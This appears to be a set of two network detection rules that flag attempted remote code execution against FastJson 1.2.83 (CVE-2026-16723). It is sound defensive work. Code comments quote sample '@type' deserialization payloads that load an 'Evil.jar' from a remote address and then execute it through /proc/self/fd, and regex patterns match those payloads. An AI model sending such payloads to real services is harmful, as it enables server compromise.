rule fastjson_rce_download_post_request_cve_2026_16723
{
    meta:
	
      description = "Detect attemped RCE in FastJson 1.2.83 (CVE-2026-16723)"
	  reference   = "https://fearsoff.org/research/fastjson-1-2-83-rce"
      filter      = "Frames (frames:)"
      author      = "Netomize"
      date        = "28/07/2026"
	  track_state = "set,fastjson_dld_req,noalert"

	strings:
	
		// {"@type": "jar:http://127.0.0.1:8080/Evil.jar!/Evil"}
		$type_dsr = /"@type"\s*:\s*"jar:[^"]{12,256}"/ nocase
			
    condition:

	  tcp.is_set
	  and 
	  tcp.data.size > 29
	  and 
	  flow.to_server
	  and
	  $type_dsr
}

rule fastjson_rce_execute_post_request_cve_2026_16723
{
    meta:
	
      description = "Detect attemped RCE in FastJson 1.2.83 (CVE-2026-16723)"
	  reference   = "https://fearsoff.org/research/fastjson-1-2-83-rce"
      filter      = "Frames (frames:)"
      author      = "Netomize"
      date        = "28/07/2026"
	  track_state = "isset,fastjson_dld_req,alert"

	strings:
	
		// {"@type": "jar:file:/proc/self/fd/10!/Evil"}
		$type_xfile = /"@type"\s*:\s*"jar:file:\/proc\/self\/fd\/\d/ nocase
			
    condition:

	  tcp.is_set
	  and 
	  tcp.data.size > 29
	  and 
	  flow.to_server
	  and
	  $type_xfile
}